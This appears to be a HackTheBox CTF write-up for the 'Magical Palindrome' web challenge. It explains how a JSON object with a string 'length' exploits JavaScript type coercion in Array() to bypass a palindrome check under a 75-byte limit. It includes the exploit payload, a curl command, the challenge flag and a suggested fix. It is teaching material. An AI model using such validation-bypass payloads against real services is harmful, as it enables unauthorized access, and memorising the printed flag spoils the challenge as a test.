---
title: "Magical Palindrome"
slug: htb-magical-palindrome
excerpt: "JavaScript Type Coercion exploit to bypass palindrome validation with minimal payload"
coverImage: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800"
coverImageAlt: "Magical Palindrome - HackTheBox CTF writeup"
categories:
  - HackTheBox
  - Web
  - Type Coercion
  - JavaScript
date: 2025-01-28
showToc: true
---

> In Dumbledore's absence, Harry's memory fades, leaving crucial words lost. Delve into the arcane world, harness the power of JSON, and unveil the hidden spell to restore his recollection. Can you help harry to find path to salvation?

## Initial Analysis

### Examining the Source Code

The challenge provides several configuration files. The key files are:

**index.mjs** - Main server logic:

```javascript
const IsPalinDrome = (string) => {
    if (string.length < 1000) {
        return 'Tootus Shortus';
    }

    for (const i of Array(string.length).keys()) {
        const original = string[i];
        const reverse = string[string.length - i - 1];

        if (original !== reverse || typeof original !== 'string') {
            return 'Notter Palindromer!!';
        }
    }

    return null;
}

app.post('/', async (c) => {
    const {palindrome} = await c.req.json();
    const error = IsPalinDrome(palindrome);
    if (error) {
        c.status(400);
        return c.text(error);
    }
    return c.text(`Hii Harry!!! ${flag}`);
});
```

**nginx.conf** - Server configuration:

```nginx
server {
    listen 80;
    server_name 127.0.0.1;
    client_max_body_size 75;  // Only 75 BYTES allowed!

    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_read_timeout 5s;
    }
}
```

### The Challenge

We need to:

1. Send a palindrome with `length >= 1000`
2. Keep the request body under 75 bytes
3. Pass the palindrome validation check

At first glance, this seems impossible - a JSON payload with 1000 characters would be over 1000 bytes!

## The Vulnerability

### JavaScript Type Coercion Bug

The vulnerability lies in how JavaScript handles the `Array()` constructor with different data types.

**Key Observations:**

1. When `string.length` is a **NUMBER** (e.g., `1000`):

```javascript
Array(1000).keys()  // Creates iterator with 1000 values: 0, 1, 2, ..., 999
```

2. When `string.length` is a **STRING** (e.g., `"1000"`):

```javascript
Array("1000").keys()  // Creates array ["1000"] with ONE element!
// Iterator yields only: 0
```

### The Exploit

By sending an object with:

- `length` as a **string** `"1000"` (not a number)
- Properties at indices `0` and `999`

We can:

1. **Pass the length check:** `"1000" < 1000` - JavaScript coerces the string to number - `1000 < 1000` - `false`
2. **Minimize loop iterations:** `Array("1000")` creates an array with only ONE element, so the loop runs only ONCE
3. **Pass the palindrome check:** The single iteration only checks `string[0]` vs `string[999]`, both set to `"a"`

## The Solution

### Exploit Payload

```json
{"palindrome":{"0":"a","999":"a","length":"1000"}}
```

**Payload size:** 50 bytes (well under the 75-byte limit!)

### Execution Flow

```javascript
// Step 1: Length check
"1000" < 1000  // String coerced to number: 1000 < 1000 = false

// Step 2: Create array
Array("1000")  // Creates ["1000"] - array with ONE element

// Step 3: Loop iteration
for (const i of Array("1000").keys()) {  // Yields only: i=0
    const original = string[0];      // = "a"
    const reverse = string["1000" - 0 - 1];  // = string[999] = "a"

    if ("a" !== "a" || typeof "a" !== 'string') {  // false || false = false
        return 'Notter Palindromer!!';
    }
}

// Step 4: Success!
return null;  // Returns flag
```

### Final Command

```bash
curl -X POST http://target:port \
  -H "Content-Type: application/json" \
  -d '{"palindrome":{"0":"a","999":"a","length":"1000"}}'
```

### Result

```
Hii Harry!!! HTB{Lum0s_M@x!ma}
```

## Key Takeaways

- **Type Coercion Vulnerabilities:** JavaScript's automatic type coercion can lead to unexpected behavior
- **Array Constructor Behavior:** `Array(n)` behaves differently when `n` is a number vs. a string
- **Input Validation:** Always validate not just the value but also the **type** of user inputs
- **Defense:** Use strict equality (`===`) and type checking, especially when dealing with user-controlled data

### Proper Fix

```javascript
const IsPalinDrome = (string) => {
    // Validate input type
    if (typeof string !== 'string') {
        return 'Invalid input type';
    }

    // Ensure length is a number
    if (typeof string.length !== 'number' || string.length < 1000) {
        return 'Tootus Shortus';
    }

    // ... rest of validation
}
```

## Flag

```
HTB{Lum0s_M@x!ma}
```
